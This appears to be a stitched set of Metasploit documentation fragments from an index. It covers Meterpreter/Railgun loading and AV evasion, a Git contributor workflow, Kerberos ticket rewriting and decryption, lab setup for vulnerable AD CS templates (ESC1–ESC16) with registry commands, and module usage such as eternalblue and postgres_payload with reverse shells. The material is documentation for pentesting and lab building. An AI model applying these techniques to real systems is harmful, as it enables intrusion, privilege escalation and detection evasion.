meterpreter-&gt;&gt;meterpreter: Copy JNA from classpath to file system meterpreter-&gt;&gt;meterpreter: System.load(tempPath) meterpreter-&gt;&gt;meterpreter: tempPath.deleteOnExit() end rect rgb(191, 223, 255, .3) note right of meterpreter: Load Railgun if it's &lt;br &gt;not been loaded before meterpreter-&gt;&gt;meterpreter: Use JNA to reflectively load Railgun end meterpreter-&gt;&gt;meterpreter: invoke Railgun call meterpreter--&gt;&gt;-msfconsole: Railgun result msfconsole--&gt;&gt;-user: Module results . Unfortunately the Meterpreter compatibility data in modules are not granular enough - and it is likely that a post module will implicitly load Railgun via a transitive module mixin. For instance, at the time of writing the lib/msf/core/post/file.rb mixin specifies a requirement on Railgun. This would result in most modules sending the Railgun/JNA libraries to Meterpreter when they are not required, as it is unlikely that the get_drives method would be invoked. This compatibility metadata could be improved, but is a blocker for this implementation. Alternative Implementation 2 . An alternative implementation to moving the architecture detection from stdapi to core - would be to include all possibly supported platform types for the JNA / Railgun libraries - approx. 3MB of additional data. This is not a viable solution. ",

    "title": "Loading Libraries",
    "content": "Java supports loading native libraries with either System.load(String libname) or System.loadLibrary(String filename). These methods require writing the shared library to disk temporarily, as it does not support loading libraries from memory. When temporarily extracting the JNA library to disk, we would need to make sure that we can delete it when we are done with the Meterpreter session. This can be achieved using Java’s File.deleteOnExit() method. This is executed only if the session exits as expected; crashes or getting killed by the AV results in the library being left on disk. Writing a shared library to disk is an easy way to get flagged by an AV that’s running on the victim’s machine. This might not be an issue as to get a Java Meterpreter session in the first place, e.g. the Microsoft Defender AV has to be disabled, and the JNA library might be white-listed. Another approach that we have briefly evaluated is running shellcode from Java without using JNI, which may be possible with schierlm’s Java Shellcode prototype. Which can execute shellcode in memory. There may be compatibility edge cases with each JDK/JRE version - depending on the JVM memory layout. This approach has only been verified to work on 32 bit Oracle Java 6. Each Java version may require additional logic, and automated/manual verification steps to ensure it works as expected. The development effort to support x64 is currently unknown. The shellcode used with the JIT Shellcode Runner would let us load a shared library from memory. This would avoid the need to write the shared library to disk. Therefore, short term solution: . | Write JNA to disk, as it’s got a higher chance of being allowed by the file system | Use JNA to reflectively load our custom Railgun C library - resulting in the Railgun library not being written to disk | . Long term solution: . | Attempt to reflectively load JNA via reflection, which may be possible with schierlm’s Java Shellcode prototype - but the proof of concept was only verified to currently work with 32bit Java 1.7, and may not work on newer versions | Use the above reflection approach to also load Railgun | .

Metasploit is more than a framework, it’s a collective and a community of people around the world who are driven to make the Internet – and therefore, human civilization – a better place. Gushing aside, if you want to keep in sync with upstream, the hard way (and therefore, best way), is to have a local clone of origin/mestasploit-framework on your local workstation. (Linux is preferred, but there are servicable solutions for OSX and Windows). And, with that said, the GitHub documentation is pretty excellent in explaining how to do this – it’s really not all that hard. Take a look at their Fork A Repo docs, and do what it says. One thing I like to do is to keep separate branches for master (which tracks origin/master), and upstream-master (which tracks, unsurprisingly, upstream/master). If you just want to know how to add an upstream remote, check it out. Once you’ve done that, all you need to do is to pull one of these: . git checkout -b upstream-master --track upstream/master git checkout master git merge --ff-only upstream-master git commit git push origin . Now, this only works well if you never commit to master. If you do, you’re going to have a bad time, as you’ll eventually hit a dreaded merge conflict. Any change you make, be it for local experimentation or public proposal, should be done in a branch from the master branch (or, if you’re a habitual committer, a branch off the upstream-master branch).

First, go to the Rapid7 branch, and click the green, somewhat subtle mini-PR button. Then, click Compare across forks, and set base fork to your fork, while leaving the head fork pointing to Rapid7’s fork. That’ll take you to a URL like this: https://github.com/rapid7/metasploit-framework/compare/YOURGITHUBNAME:master...master . Next, you’ll hit the big green Create a Pull Request button, which will drop you to a new PR page, against your own fork. Fill it in, then immediately click the PRs icon on the left side, find your new PR, and merge it. This will keep your GitHub-hosted fork up-to-date, and if you prefer using the GitHub UI over a real development environment, you can jump in and start making changes there. This method is especially handy for light changes, like documentation or cosmetic changes to modules. However, using the GitHub UI means that you are necessarily not testing new modules or libraries, and you of course cannot sign your commits, which is horrifying.

Rewrite Service Tickets &amp; RAM Injection . Kerberos tickets are signed with the NTLM hash of the password. If the ticket hash has been cracked then it is possible to rewrite the ticket with Kerberoast python script. This tactic will allow users to impersonate any domain user or a fake account when the service is going to be accessed. Additionally privilege escalation is also possible as the user can be added into an elevated group such as Domain Admins. ➜ kerberoast git:(master) ✗ python3 kerberoast.py -p N0tpassword! -r 1-40a10000-Administrator@HTTP~testService-EXAMPLE.COM.kirbi -w Administrator.kirbi -u 500 .

[*] Auxiliary module execution completed . Decrypting Kerberos traffic in wireshark . The Kerberos protocol makes use of encrypted values which will show as an opaque blob of hex characters in Wireshark. Configuring Wireshark with a Keytab file can decrypt these values automatically. For instance in a TGS-REQ request within Wireshark, the cipher below is encrypted using the user account’s password and is not human readable: . tgs-req pvno: 5 msg-type: krb-tgs-req (12) padata: 1 item PA-DATA pA-TGS-REQ padata-type: pA-TGS-REQ (1) padata-value: 6e82044730820443a003020105a10302010ea20703050000000000a38203c6618203c230… ap-req pvno: 5 msg-type: krb-ap-req (14) Padding: 0 ap-options: 00000000 ticket authenticator etype: eTYPE-ARCFOUR-HMAC-MD5 (23) cipher: 0bbb6dbc29413df5905d45c97a3d05239bd609326ff4a410f47048c3f4e22c3ea8003985… ^^^^^^^^^^^^^^ Value encrypted using the user account's password . The easiest way to decrypt these opaque blobs is to generate a Keytab file with Metasploit using the secretsdump scenario above or similar. After generating a keytab file in the Wireshark GUI go to Edit -&gt; Preferences -&gt; Protocols -&gt; KRB5 and modify the following options: . | Set try to decrypt Kerberos blobs to true | Set the Kerebros keytab file to the keytab file generated by your domain controller | . After confirming the new settings - the previously encrypted which were signed with the user’s password, and the decryptable session key should be viewable in Wireshark. For example the previous TGS-REQ authenticator blob is now decrypted in the Wireshark UI. Wireshark on Linux may not show the decrypted packet information in the packet details pane, instead it appears as a separate tab in the packet bytes pane: . tgs-req pvno: 5 msg-type: krb-tgs-req (12) padata: 1 item PA-DATA pA-TGS-REQ padata-type: pA-TGS-REQ (1) padata-value: 6e82044730820443a003020105a10302010ea20703050000000000a38203c6618203c230… ap-req pvno: 5 msg-type: krb-ap-req (14) Padding: 0 ap-options: 00000000 ticket authenticator etype: eTYPE-ARCFOUR-HMAC-MD5 (23) cipher: 0bbb6dbc29413df5905d45c97a3d05239bd609326ff4a410f47048c3f4e22c3ea8003985… Decrypted keytype 23 usage 7 using learnt encASRepPart_key in frame 475 (id=475.1 same=0) (f161f360...) # ... authenticator authenticator-vno: 5 crealm: ADF3.LOCAL cname name-type: kRB5-NT-PRINCIPAL (1) cname-string: 1 item CNameString: a cusec: 303247 ctime: 2022-04-10 15:21:31 (UTC) ^^^^^^^^^^^^^^ authenticator value now decrypted using the previously generated keytab file . If you have exported the krbtgt account to the keytab file - Wireshark will also decrypt the TGT ticket itself. If not - Wireshark will generate warnings about being unable to decrypt the TGT ticket which is signed using the krbtgt account. Additional details: https://wiki.wireshark.org/Kerberos . If you are on a Windows domain controller it is possible to use the ktpass program to generate keytab files: . ktpass /crypto All /princ Administrator@DEMO.LOCAL /pass p4$$w0rd /out demo.keytab /ptype KRB5_NT_PRINCIPAL . It is easier to use the Metasploit module, but if you do use ktpass - be aware of the following issues: . | If the password contains $ it is easier to run the ktpass command in cmd rather than powershell to avoid unexpected variable substitution | If there is a Missing keytype 18 warning for etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18) in Wireshark - verify that the principal name is correct within the ktpass generation command . | This should match the initial AS-REQ KRB ERROR salt, found in krb-error -&gt; edata -&gt; ETYPE-INFO2-ENTRY -&gt; salt | . | . Common Mistakes . Invalid REALM/PRINCIPAL/SALT . When generating a keytab with a password, a salt is generated by default from the principal and realm unless one is explicitly provided. For Windows Active Directory environments, these values are case-sensitive. The realm should be upper case, and the principal is case-sensitive. When the SALT is not explicitly provided a salt will be generated that follows the Windows naming convention, for instance: . REALM.EXAMPLEAdministrator . ",

    "content": "First, fork and clone the rapid7/metasploit-framework repo, following these instructions. I like using ssh with ~/.ssh/config aliases as described here, but the https method will work, too. Once this is done, you will have a remote repository called “origin,” which points to your forked repository on GitHub. You will be doing most of your work in your own fork of Metasploit, even if you have commit rights to Rapid7’s fork. Now, we’re going to add an “upstream” repository to talk to the Rapid7 repository. In addition, we’re going to add a magical line to the config file that will let us see all pull requests against the Rapid7 repo (both open and closed). Note that this will take a minute since you’re adding some hundreds of megs to your clone’s refs. So, open up metasploit-framework/.git/config with your favorite editor, add an upstream remote, and add the pull request refs for both your and Rapid7’s forks. In the end, you should have a section that started off like this: . [remote \"upstream\"] fetch = +refs/heads/*:refs/remotes/upstream/* fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* url = https://github.com/rapid7/metasploit-framework . And now it looks like this: . [remote \"upstream\"] fetch = +refs/heads/*:refs/remotes/upstream/* fetch = +refs/pull/*/head:refs/remotes/upstream/pr/* url = git@github.com:rapid7/metasploit-framework.git [remote \"origin\"] fetch = +refs/heads/*:refs/remotes/origin/* fetch = +refs/pull/*/head:refs/remotes/origin/pr/* url = https://github.com/YOURNAME/metasploit-framework . Some people like to copy these over into remotes named “rapid7” and “yourusername” just so they don’t have to remember about “origin” and “upstream,” but for this doc, we’ll just assume you have “origin” and “upstream” defined like this. Now, you can git fetch the remote PRs. This will take a little bit, since we have a couple dozen MBs of pull request data.

    "content": "A manageable strategy for dealing with outstanding PRs is to start pre-merge testing on the pull request in isolation. For example, to work on PR #1217, we would: . $ git checkout upstream/pr/1217 Note: checking out 'upstream/pr/1217'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b new_branch_name HEAD is now at 9e499e5... Make BindTCP test more robust ((no branch)) todb@mazikeen:~/git/rapid7/metasploit-framework . $ git checkout -b landing-1217 . Now, we’re on a local branch identical to the original pull request, and can move on from there. We can make our changes, isolated from master, and then either send them back to the contributor (this requires looking up the original contributor’s GitHub username and branch name on GitHub), or if there aren’t any changes or the changes are trivial, we can land them (if you have committer rights to Rapid7’s repo, this is where you land them to the upstream repo). In this particular case with PR #1217, I did want to send some changes back to the contributor. Important: If the codebase the contributor’s PR is based on is severely outdated (e.g., they branched off an outdated master), you should not test their PR in isolation as described above. Instead, you should create a test branch that is identical to the latest codebase, merge the contributor’s PR into the test branch, and then start your testing. You may need to bundle install to ensure you’re using the right gems. Here’s an example with #6954 (your workflow may vary): . $ git checkout upstream/master Note: checking out 'upstream/master'. You are in 'detached HEAD' state. You can look around, make experimental changes and commit them, and you can discard any commits you make in this state without impacting any branches by performing another checkout. If you want to create a new branch to retain commits you create, you may do so (now or later) by using -b with the checkout command again. Example: git checkout -b &lt;new-branch-name&gt; HEAD is now at afbeb2b...

This ensures that the contributor’s PR is being tested against the latest codebase and not an outdated one. If you do not do this, when you land the PR, you may end up breaking Metasploit. Note that the example above will leave you in a detached HEAD state. This is fine if you just want to test the module in question, however if you want to make any changes, don’t forget to make a new branch.

    "content": "The auxiliary/gather/ldap_esc_vulnerable_cert_finder module allows users to query a LDAP server for vulnerable certificate templates and will print these certificates out in a table along with which attack they are vulnerable to and the SIDs that can be used to enroll in that certificate template. Additionally the module will also print out a list of known certificate servers along with info about which vulnerable certificate templates the certificate server allows enrollment in and which SIDs are authorized to use that certificate server to perform this enrollment operation. Currently the module is capable of checking for certificates that are vulnerable to ESC1, ESC2, ESC3, ESC13, and ESC15. The module is limited to checking for these techniques due to them being identifiable remotely from a normal user account by analyzing the objects in LDAP. Installing AD CS . | Install AD CS on either a new or existing domain controller | Open the Server Manager | Select Add roles and features | Select “Active Directory Certificate Services” under the “Server Roles” section | When prompted add all of the features and management tools | On the AD CS “Role Services” tab, leave the default selection of only “Certificate Authority” | Completion the installation and reboot the server | Reopen the Server Manager | Go to the AD CS tab and where it says “Configuration Required”, hit “More” then “Configure Active Directory Certificate…” | Select “Certificate Authority” in the Role Services tab | Keep all of the default settings, noting the “Common name for this CA” value on the “CA Name” tab. | Accept the rest of the default settings and complete the configuration | . Setting up a ESC1 Vulnerable Certificate Template . | Open up the run prompt and type in certsrv. | In the window that appears you should see your list of certification authorities under Certification Authority (Local). | Right click on the folder in the drop down marked Certificate Templates and then click Manage. | Scroll down to the User certificate. Right click on it and select Duplicate Template. | From here you can refer to https://github.com/RayRRT/Active-Directory-Certificate-Services-abuse/blob/3da1d59f1b66dd0e381b2371b8fb42d87e2c9f82/ADCS.md for screenshots. | Select the General tab and rename this to something meaningful like ESC1-Template, then click the Apply button. | In the Subject Name tab, select Supply in the request and click Ok on the security warning that appears. | Click the Apply button. | Scroll to the Extensions tab. | Under Application Policies ensure that Client Authentication, Server Authentication, KDC Authentication, or Smart Card Logon is listed. | Click the Apply button. | Under the Security tab make sure that Domain Users group listed and the Enroll permissions is marked as allowed for this group. | Under Issuance Requirements tab, ensure that under Require the following for enrollment that the CA certificate manager approval box is unticked, as is the This number of authorized signatures box. | Click Apply and then Ok | Go back to the certsrv screen and right click on the Certificate Templates folder. Then click New followed by Certificate Template to Issue. | Scroll down and select the ESC1-Template certificate, or whatever you named the ESC1 template you created, and select OK. The certificate should now be available to be issued by the CA server. | . Setting up a ESC2 Vulnerable Certificate Template . | Open up certsrv | Scroll down to Certificate Templates folder, right click on it and select Manage. | Find the ESC1 certificate template you created earlier and right click on that, then select Duplicate Template. | Select the General tab, and then name the template ESC2-Template. Then click Apply. | Go to the Subject Name tab and select Build from this Active Directory Information and select Fully distinguished name under the Subject Name Format. The main idea of setting this option is to prevent being able to supply the subject name in the request as this is more what makes the certificate vulnerable to ESC1. The specific options here I don’t think will matter so much so long as the Supply in the request option isn’t ticked. Then click Apply. | Go the to Extensions tab and click on Application Policies. Then click on Edit. | Delete all the existing application policies by clicking on them one by one and clicking the Remove button. | Click the Add button and select Any Purpose from the list that appears. Then click the OK button. | Click the Apply button, and then OK. The certificate should now be created. | Go back to the certsrv screen and right click on the Certificate Templates folder. Then click New followed by Certificate Template to Issue. | Scroll down and select the ESC2-Template certificate, or whatever you named the ESC2 template you created, and select OK. The certificate should now be available to be issued by the CA server. | . Setting up a ESC3 Template 1 Vulnerable Certificate Template . | Follow the instructions above to duplicate the ESC2 template and name it ESC3-Template1, then click Apply. | Go to the Extensions tab, click the Application Policies entry, click the Edit button, and remove the Any Purpose policy and replace it with Certificate Request Agent, then click OK. | Click Apply. | Go to Issuance Requirements tab and double check that both CA certificate manager approval and This number of authorized signatures are unchecked. | Click Apply if any changes were made or the button is not grey’d out, then click OK to create the certificate. | Go back to the certsrv screen and right click on the Certificate Templates folder. Then click New followed by Certificate Template to Issue. | Scroll down and select the ESC3-Template1 certificate, or whatever you named the ESC3 template number 1 template you just created, and select OK.

Setting up a ESC3 Template 2 Vulnerable Certificate Template . | Follow the instructions above to duplicate the ESC2 template and name it ESC3-Template2, then click Apply. | Go to the Extensions tab, click the Application Policies entry, click the Edit button, and remove the Any Purpose policy and replace it with Client Authentication, then click OK. | Click Apply. | Go to Issuance Requirements tab and double check that both CA certificate manager approval is unchecked. | Check the This number of authorized signatures checkbox and ensure the value specified is 1, and that the Policy type required in signature is set to Application Policy, and that the Application policy value is Certificate Request Agent. | Click Apply and then click OK to issue the certificate. | Go back to the certsrv screen and right click on the Certificate Templates folder. | Click New followed by Certificate Template to Issue. | Scroll down and select the ESC3-Template2 certificate, and select OK. | The certificate should now be available to be issued by the CA server. | . Setting up a ESC4 Vulnerable Certificate Template . | Follow the instructions above to duplicate the ESC2 template and name it ESC4-Template, then click Apply. | Go to the Security tab. | Under Groups or usernames select Authenticated Users | Under Permissions for Authenticated Users select Write -&gt; Allow. | Click Apply and then click OK to issue the certificate. | Go back to the certsrv screen and right click on the Certificate Templates folder. | Click New followed by Certificate Template to Issue. | Scroll down and select the ESC3-Template2 certificate, and select OK. | The certificate should now be available to be issued by the CA server. | . Setting up a ESC8 Vulnerable Host . | Follow instructions for creating an AD CS enabled server | Select Add Roles and Features | Under “Select Server Roles” expand Active Directory Certificate Services and add Certificate Enrollment Policy Web Service, Certificate Enrollment Web Service, and Certificate Authority Web Enrollment. | For each selection, accept the default for any pop-up. | Accept the default features and install. | When the installation is complete, click on the warning in the Dashboard for post-deployment configuration. | Under Credentials, accept the default | Under Role Services, select Certificate Authority Web Enrollment, Certificate Enrollment Web Service, and Certificate Enrollment Policy Web Service | In CA for CES, accept the defaults | In Authentication Types, accept the default integrated authentication | In Service account for CES, select Use built-in application pool identity | Accept default integrated authentication for CEP | Select the domain certificate in Server Certificate (the one that starts with the domain name by default) if more than one appears. | Accept the remaining defaults. | . Setting up a ESC9 Vulnerable Certificate Template . | Open up the run prompt and type in certsrv. | In the window that appears you should see your list of certification authorities under Certification Authority (Local). | Right click on the folder in the drop down marked Certificate Templates and then click Manage. | Scroll down to the User certificate. Right click on it and select Duplicate Template. | The User certificate already has the Client Authentication EKU enabled so we can use this as a base template. | Select the Subject Name tab and select Build from this Active Directory Information, under the Subject Name Format section select User Principal Name (UPN) (or DNS Name depending on what scenario you’re attempting to exploit). | Under the Subject Name Format also be sure to unselect Include e-mail name in subject name and E-mail name. | Select the General tab and rename this to something meaningful like ESC9-Template, then click the Apply button. | Select the Security tab and click the Add button. | Enter user2 (or whatever user’s UPN you will be changing for this attack).

Setting up a ESC13 Vulnerable Certificate Template . | Follow the instructions above to duplicate the ESC2 template and name it ESC13, then click Apply. | Go to the Extensions tab, click the Issuance Policies entry, click the Add button, click the New... button. | Name the new issuance policy ESC13-Issuance-Policy. | Copy the Object Identifier as this will be needed later (ex: 11.3.6.1.4.1.311.21.8.12682474.6065318.6963902.6406785.3291287.83.1172775.12545198`). | Leave the CPS location field blank. | Click Apply. | Open Active Directory Users and Computers, expand the domain on the left hand side. | Right click Users and navigate to New -&gt; Group. | Enter ESC13-Group for the Group Name. | Select Universal for Group scope and Security for Group type. | Click Apply. | Open ADSI Edit. | In the left hand side right click ADSI Edit and select Connect to.... | Under Select a well known naming context select Default naming context. | Select the newly established connection, select the domain, select CN=User. | On the right hand side find the recently created security group CN=ESC13-Group, right click select properties. | Copy the value of the distinguishedName attribute, save this as we’ll need it later. | Back on the left hand side establish another connection, right click ADSI Edit and select Connect to.... | This time under Select a well known naming context select Configuration. | Select the newly established connection, select the domain, select CN=Services -&gt; CN=Public Key Services -&gt; CN=OID. | In the right hand side find the object that corresponds to the Object Identifier saved earlier. | The OID saved earlier ended in 12545198, the object on the right will start with CN=12545198. followed by 34 hex characters. ex: CN=12545198.7BCA239924D9515E63EA6B6F00748837). | Once located right click -&gt; properties, select msDS-OIDToGroupLink. | Paste the distingushedName of the security group saved above (ex: CN=ESC13-Group,CN=Users,DC=demo,DC=lab). | Click Apply. | Go back to the certsrv screen and right click on the Certificate Templates folder. | Click New followed by Certificate Template to Issue. | Scroll down and select the ESC13-Template certificate, and select OK. | The certificate should now be available to be issued by the CA server. | . Setting up a ESC15 Vulnerable Certificate Template . | ESC15 depends on the schema version of the template being version 1 - which can no longer be created so we will edit an existing template that is schema version 1. | Right click the WebServer template, select properties. | Go to the Security Tab. | Under Groups or usernames select Authenticated Users. | Under Permissions for Authenticated Users select Enroll -&gt; Allow. | Click Apply. | Go back to the certsrv screen and right click on the Certificate Templates folder and ensure WebServer is listed, if it’s not, add it. | The certificate should now be available to be issued by the CA server. | . Setting up a ESC16 Vulnerable Certificate Template . Configuring Windows to be Vulnerable to ESC16 . | There are two ECS16 scenarios and both depend on the CA having the OID: 1.3.6.1.4.1.311.25.2 being present in its policy\\DisableExtensionList | Run the following Powershell snippet to add the OID to the DisableExtensionList if it is not already present: ```powershell $activePolicyName = Get-ItemProperty -Path “HKLM:\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration*\\PolicyModules” -Name “Active” | Select-Object -ExpandProperty Active $disableExtensionList = Get-ItemProperty -Path “HKLM:\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration*\\PolicyModules$activePolicyName” -Name “DisableExtensionList” | Select-Object -ExpandProperty DisableExtensionList | . if (-not ($disableExtensionList -contains “1.3.6.1.4.1.311.25.2”)) { $updatedList = $disableExtensionList + @(“1.3.6.1.4.1.311.25.2”) Set-ItemProperty -Path “HKLM:\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration*\\PolicyModules$activePolicyName” -Name “DisableExtensionList” -Value $updatedList Write-Output “OID 1.3.6.1.4.1.311.25.2 has been added to the DisableExtensionList.” } else { Write-Output “OID 1.3.6.1.4.1.311.25.2 is already present in the DisableExtensionList.” } . #### ESC16 Scenario 1 When a CA has the OID `1.3.6.1.4.1.311.25.2` added to its `policy\\DisableExtensionList` registry setting every certificate issued by this CA will lack this SID security extension. This effectively makes all templates published by this CA behave as if they were individually configured with the `CT_FLAG_NO_SECURITY_EXTENSION` flag (as seen in ESC9). So if `StrongCertificateBindingEnforcement` is not set to `2` we can exploit this weak mapping. In order to create a template vulnerable to ESC16 scenario 1, follow the first 15 steps in `Setting up a ESC9 Vulnerable Certificate Template`, which is all the steps up to and excluding the `msPKI-Enrollment-Flag\", 0x80000` powershell step which is how you set the `CT_FLAG_NO_SECURITY_EXTENSION`. Ensure that `StrongCertificateBindingEnforcement` is set to `0` or `1` (not `2`) by running the following command listed in `Configuring Windows to be Vulnerable to ESC9` #### ESC16 Scenario 2 When a CA has the OID `1.3.6.1.4.1.311.25.2` added to its `policy\\DisableExtensionList` and `StrongCertificateBindingEnforcement` is set to `2`, there is still a way to exploit the template. If the policy module's `EditFlags` has the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set (which is essentially ESC6), then the template is vulnerable to ESC16 scenario 2. Ensure the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag is set by running following PowerShell command: ```powershell certutil -setreg policy\\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2 . Then restart the Certificate Services service: . net stop certsvc net start certsvc . Then vefify the flag is set by running: . certutil -getreg policy\\EditFlags . ",

The following is a high-level overview of Metasploit 5.0’s features and capabilities. | Metasploit users can now run the PostgreSQL database by itself as a RESTful service, which allows for multiple Metasploit consoles and external tools to interact with it. | Parallel processing of the database and regular msfconsole operations improves performance by offloading some bulk operations to the database service. | A JSON-RPC API enables users to integrate Metasploit with additional tools and languages. | This release adds a common web service framework to expose both the database and the automation APIs; this framework supports advanced authentication and concurrent operations. Read more about how to set up and run these new services here. | Adds evasion module type and libraries to let users generate evasive payloads without having to install external tools. Read the research underpinning evasion modules here. Rapid7’s first evasion modules are here. | The metashell feature allows users to run background sessions and interact with shell sessions without needing to upgrade to a Meterpreter session. | External modules add Metasploit support for Python and Go in addition to Ruby. | Any module can target multiple hosts by setting RHOSTS to a range of IPs, or by referencing a hosts file with the file:// option. Metasploit now treats RHOST and RHOSTS as identical options. | An updated search mechanism improves Framework start time and removes database dependency. | . ",

    "title": "Payload Improvements",
    "content": "Quite a few payload improvements have been made, most but not all have been for the Meterpreter payload and it’s various implementations. Among other things, it was updated to support AES encryption in CBC mode in all implementations on all transports. This helps to secure framework users data in transit. Now any files transferred, commands issued, etc. are encrypted on the network using a AES and a key negotiated via RSA. This helps remove static strings from network traffic, but it’s not the only change targeting obfuscation. Each of the Meterpreter commands were replaced with an integer equivalent, thus removing conspicuous values such as stdapi_fs_file_copy, core_migrate and mimikatz_custom_command. Additionally, the payload binaries were updated to utilize functions by ordinal value rather than by name. This allows them to be called without disclosing their own conspicuous values such as RefletiveLoader, ext_server_, etc. Lastly, the static “Block API” used by almost all x86 and x64 Windows shellcode payloads was updated to be polymorphic, causing it to be randomized on each invocation. In some payloads, the Block API accounts for as much as half of the shellcode and was an easy target for signature-based detection. All of these changes mark strides towards complicating the identification of key artifacts generated by Metasploit via static analysis, ie. signatures. Compatibility Changes . Metasploit 6 drops Meterpreter support for Windows versions older than XP SP2. This service pack adds a number of API methods that are required by Meterpreter and backporting compatibility is not a priority at this time. The Meterpreter stage will fail to load on these older, unsupported versions. This results in a message saying that the session was closed. ",

    "title": "SMB 3",
    "content": "Metasploit 6 adds support for SMB client connections using the version 3 dialects. This adds compatibility for a large pool of modules to work in environments where SMB version 1 and 2 have been disabled. Additionally, one of the most notable improvements of the version 3 dialects is encryption support, which when negotiated allows the framework to secure it’s connections to compatible SMB servers. SMB version 3, which was added in Windows 8 and Server 2012 incorporates a few security improvements leading to many organizations migrating towards its exclusive use within their environments. While many modules were updated to use the RubySMB SMB 3 implementation, not all were updated. Notably many older exploits that pre-date the release of SMB 3 were not updated and continue to use the original Rex implementation of the protocol. For those modules that have been updated however, users will be able to use them without any changes to their work flow. By default the newest dialect will be negotiated with the remote server and if it is one of the dialects within version 3 that supports encryption, the framework will use encryption by default. Users can alter this behavior by setting the SMB::AlwaysEncrypt and SMB::ProtocolVersion options. SMB::AlwaysEncrypt enforces encryption for SMB 3 connections even when the server does not require it (defaults to: true) while SMB::ProtocolVersion is a comma separated list of versions to allow the framework to negotiate (default: 1,2,3). Module authors looking to write SMB modules should note the move towards the RubySMB protocol stack instead of the legacy Rex implementation. Much of the functionality is standardized within the mixins however some edge-case functionality must still be ported over to RubySMB.

    "content": "The current data storage mechanism couples the metasploit core framework code to the current data storage technology. Coupling causes inflexibility which are reflected via the following problems: . | Changes to the current data model are complex | The ability to support/use different data storage technologies is difficult | Promotes a monolithic architecture where poor performance in any segment of the software affects the entire system (large network scans) | . Our solution to this is a data service proxy. A data service proxy allows us to separate core Metasploit Framework code from the underlying data service technology. The framework.db reference to data services is no longer tied directly to the underlying data storage, but instead all calls are proxied to an underlying implementation. Currently we plan to support the legacy data storage technology stack (RAILS/PostgreSQL) which we hope to eventually phase out. The new implementation will use a RESTful (https://en.wikipedia.org/wiki/Representational_state_transfer) approach whereby calls to framework.db can be proxied to a remote web service that supports the same data service API. We have built a web service that runs atop the current data storage service for the community. This approach enables us to: . | More easily enhance the Metasploit data model | Run a web-based data service independent of the Metasploit Framework . | Reduces the memory used by a Metasploit Framework instance using a data service by no longer requiring a DB client | Increases throughput as storage calls don’t necessarily need to be asynchronous | Allow teams to collaborate easily by connecting to a centralized data service | . | Quickly build out data services that leverage different technology stacks | Isolate component testing | Users of metasploit can now leverage a rigid API to build other tools easily (documentation to be provided soon) | .

Note that any port can be used to run an application which communicates via HTTP/HTTPS. This document is generic advice for running and debugging HTTP based Metasploit modules, but it is best to use a Metasploit module which is specific to the application that you are pentesting. For instance: . msf &gt; search tomcat http . HTTP Examples . Auxiliary modules: . use auxiliary/scanner/http/title run https://example.com .

Specifying alternative ports: . run http://192.168.123.6:9001 . HTTP Debugging . You can log all HTTP requests and responses to the Metasploit console with the HttpTrace option, as well as enable additional verbose logging: . use auxiliary/scanner/http/title run http://example.com HttpTrace=true verbose=true .

You can see which options stilloptions to be set with the show missing command: . msf exploit(windows/smb/ms17_010_eternalblue) &gt; show missing Module options (exploit/windows/smb/ms17_010_eternalblue): Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html . Setting options . Traditional usage of Metasploit involves loading a module, and setting multiple options individually: . use exploit/linux/postgres/postgres_payload set username administrator set password pass set rhost 192.168.123.6 set rport 5432 set database postgres set lhost 192.168.123.1 set lport 5000 run . You can also specify multiple RHOSTS separated by spaces or with a CIDR subnet mask: . set rhosts 127.0.0.1 127.0.0.2 set rhosts 127.0.0.1/24 . In 2021 support for running a module and specifying module options at the same time was added, dubbed inline option support. This workflow will not only make it easier to use reverse-i-search with CTRL+R in Metasploit’s console, but it will also make it easier to share cheat sheets amongst pentesters. Example: . use exploit/linux/postgres/postgres_payload run postgres://postgres:password@192.168.123.6 lhost=192.168.123.1 lport=5000 payload=linux/x64/meterpreter/reverse_tcp target='Linux\\ x86_64' verbose=true . You can set complex options using quotes. Example: . set COMMAND \"date --date='TZ=\\\"America/Los_Angeles\\\" 09:00 next Fri' --iso-8601=ns\" . URI support for RHOSTS . Metasploit also supports the use of URI strings as arguments, which allows setting multiple options at once - i.e. username, password, rport, rhost, etc. use exploit/linux/postgres/postgres_payload run postgres://administrator:pass@192.168.123.6 lhost=192.168.123.1 lport=5000 . The following protocols are currently supported, and described in more detail below: . | cidr - Can be combined with other protocols to specify address subnet mask length | file - Load a series of RHOST values separated by newlines from a file. This file can also include URI strings | http | https | ldap | ldaps | mysql | postgres | smb | ssh | . To preserve whitespace, regardless of the protocol, use quotes: . use auxiliary/admin/postgres/postgres_sql run 'postgres://user:this is my password@192.168.1.123/database_name' sql='select version()' . In some scenarios it may be too troublesome to escape quotes within a password. In this scenario it is possible to still set the password option manually and use the URI argument without a password specified, the module will gracefully fallback to using the manually set password: . set password !@£$%^&amp;*()\"' run smb://user@192.168.123.13 . You can also specify multiple RHOST arguments, as well as provide additionally inlined options: . use scanner/smb/smb_enumshares run smb://test:test@192.168.1.223 smb://user:password@192.168.1.223 smb://test:test@127.0.0.1 verbose=true .

